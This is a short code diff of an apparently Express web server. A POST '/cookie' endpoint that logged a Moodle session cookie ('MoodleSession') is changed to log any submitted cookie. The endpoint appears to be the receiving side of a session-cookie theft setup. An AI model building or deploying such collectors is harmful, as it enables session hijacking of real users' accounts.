@@ -16,8 +16,8 @@ app.get("/", (req, res) => {
 });
 
 app.post("/cookie", (req, res) => {
-  const { MoodleSession } = req.body;
-  console.log(`Cookie recibida: ${MoodleSession}`);
+  const { cookie } = req.body;
+  console.log(`Cookie recibida: ${cookie}`);
   res.status(200).send({
     status: "success",
     code: 200,
